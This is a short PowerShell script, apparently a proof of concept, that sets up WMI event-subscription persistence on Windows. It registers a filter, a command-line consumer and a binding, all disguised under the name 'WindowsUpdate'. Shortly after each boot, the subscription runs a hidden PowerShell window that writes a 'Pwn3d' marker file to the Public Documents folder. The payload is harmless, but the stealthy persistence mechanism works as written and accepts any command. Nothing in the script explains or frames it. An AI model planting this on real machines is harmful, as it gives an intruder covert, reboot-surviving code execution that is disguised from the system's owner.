$FilterArgs = @{name='WindowsUpdate';
                EventNameSpace='root\CimV2';
                QueryLanguage="WQL";
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{ name = 'WindowsUpdate'; 
                CommandLineTemplate = 'powershell.exe -NoProfile -WindowStyle Hidden -Command "Set-Content -Path ''C:\Users\Public\Documents\pwned.txt'' -Value ''Pwn3d'' -Encoding UTF8"'; }
$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

$FilterToConsumerArgs = @{
Filter = [Ref] $Filter;
Consumer = [Ref] $Consumer;
}
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs